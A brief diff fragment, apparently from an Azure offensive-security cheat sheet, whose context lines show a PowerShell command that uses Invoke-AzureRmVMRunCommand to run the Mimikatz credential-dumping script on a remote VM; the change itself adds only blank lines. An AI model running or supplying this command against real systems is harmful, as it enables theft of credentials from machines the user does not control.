@@ -21,3 +21,5 @@ TESTRESOURCES        Remote-Test
 # Execute Powershell script on the VM
 PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
 ```
+
+
